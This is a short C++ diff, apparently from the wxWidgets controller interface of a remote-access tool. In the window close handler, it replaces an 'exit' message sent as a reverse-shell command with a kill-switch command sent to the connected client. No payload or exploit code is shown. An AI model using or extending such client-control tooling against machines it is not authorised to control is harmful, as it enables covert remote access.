@@ -92,7 +92,6 @@ FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
     sizer->Add(pnl_Left, 0, wxEXPAND | wxALL, 2);
     sizer->Add(pnl_Right, 1, wxEXPAND | wxALL, 2);
     
-
     this->SetSizerAndFit(sizer);
 
     SetClientSize(700, 450);
@@ -123,9 +122,8 @@ void FrameCliente::OnClose(wxCloseEvent& event) {
     //Talvez remplazar este por uno que cierre todos los modulos que estan corriendo?
     if (iIndex != -1) {
         p_Servidor->vc_Clientes[iIndex]->m_setFrameVisible(false);
-        p_Servidor->cChunkSend(this->sckCliente, "exit\r\n", 6, 0, false, EnumComandos::Reverse_Shell_Command);
+        p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::CLI_KSWITCH);
     }
-
     event.Skip();
 }
 
